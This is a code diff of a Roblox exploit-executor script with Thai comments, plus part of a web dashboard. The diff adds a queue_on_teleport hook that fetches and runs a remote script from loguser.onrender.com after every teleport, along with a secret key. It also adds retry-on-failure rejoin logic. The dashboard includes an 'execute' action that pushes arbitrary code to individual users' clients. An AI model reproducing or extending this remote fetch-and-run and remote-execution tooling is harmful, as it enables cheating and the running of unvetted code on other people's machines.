@@ -50,7 +50,7 @@ local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 local savedPosition = nil
 
--- บันทึกพิกัดทุกๆ 1 วินาที
+-- บันทึกพิกัดตัวละคร
 task.spawn(function()
     while task.wait(1) do
         pcall(function()
@@ -61,7 +61,17 @@ task.spawn(function()
     end
 end)
 
--- คืนค่าพิกัดเดิมเมื่อย้ายเซิร์ฟเวอร์สำเร็จ
+-- โหลดสคริปต์ซ้ำอัตโนมัติเมื่อ Teleport ย้าย Map/Server (QueueOnTeleport)
+local function queueScript()
+    local queueFunc = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+    if queueFunc then
+        pcall(function()
+            queueFunc('getgenv().SecretKey = "' .. SECRET_KEY .. '"; loadstring(game:HttpGet("https://loguser.onrender.com/script.lua"))()')
+        end)
+    end
+end
+
+-- ย้ายตำแหน่งเดิมหลังจากวาร์ปเสร็จ
 local function restorePosition()
     local joinData = LocalPlayer:GetJoinData()
     if joinData and joinData.TeleportData and joinData.TeleportData.pos then
@@ -79,11 +89,13 @@ local function restorePosition()
 end
 pcall(restorePosition)
 
--- ฟังก์ชัน Rejoin แบบแก้ไข
+-- ฟังก์ชัน Rejoin
 local isRejoining = false
 local function safeRejoin()
     if isRejoining then return end
     isRejoining = true
+
+    queueScript()
 
     local teleportOptions = Instance.new("TeleportOptions")
     if savedPosition then
@@ -91,19 +103,26 @@ local function safeRejoin()
         teleportOptions:SetTeleportData({ pos = c })
     end
 
-    pcall(function()
-        if #Players:GetPlayers() <= 1 then
-            TeleportService:Teleport(game.PlaceId, LocalPlayer, teleportOptions:GetTeleportData())
-        else
-            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer, nil, teleportOptions:GetTeleportData())
-        end
-    end)
-
-    task.wait(4)
+    -- สุ่มย้ายไป Server อื่นถ้าอยู่ใน Server เดิมคนเดียว
     pcall(function()
         TeleportService:Teleport(game.PlaceId, LocalPlayer, teleportOptions:GetTeleportData())
     end)
+
+    task.wait(3)
+    pcall(function()
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer, nil, teleportOptions:GetTeleportData())
+    end)
+    
+    task.wait(3)
+    isRejoining = false
 end
+
+-- ดักจับกรณี Teleport ล้มเหลว ให้ลองใหม่
+TeleportService.TeleportInitFailed:Connect(function()
+    isRejoining = false
+    task.wait(2)
+    safeRejoin()
+end)
 
 local gameTitle = "Place ID: " .. tostring(game.PlaceId)
 task.spawn(function()
@@ -185,11 +204,10 @@ local function sendStatus(statusType, details)
     end
 end
 
--- ตรวจจับ Error Prompt เพื่อ Auto Rejoin
+-- พยายาม Rejoin ล่วงหน้าหากขึ้น Error Prompt
 CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
     if child.Name == "ErrorPrompt" and not manualKicked then
-        task.wait(1)
-        safeRejoin()
+        pcall(safeRejoin)
     end
 end)
 
@@ -502,7 +520,7 @@ app.get('/', (req, res) => {
                     else if(action === 'execute') {
                         alert('ส่งโค้ดเรียบร้อยแล้ว!');
                         document.getElementById('code-' + userId).value = '';
-                    } else alert('ส่งคำสั่งเรียบร้อย!');
+                    } else alert('ส่งคำสั่ง Rejoin เรียบร้อย!');
                 } catch(e) { alert('เกิดข้อผิดพลาดในการส่งคำสั่ง'); }
             }
 
